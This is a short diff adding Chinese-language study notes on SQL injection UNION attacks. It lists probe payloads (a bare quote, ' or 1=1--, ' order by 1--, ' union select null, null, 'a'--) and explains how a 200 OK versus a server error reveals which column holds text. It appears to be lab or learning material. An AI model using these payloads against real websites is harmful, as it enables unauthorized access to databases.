@@ -1,0 +1,14 @@
+SQL 注入 UNION 攻击，查找包含文本的列：
+
+' 
+
+'--
+
+' or 1=1--
+
+' order by 1-- 
+
+' union select null, null, 'a'-- 假设列3，第三列是包含文本 返回200 OK
+
+否则 Inter server error
+
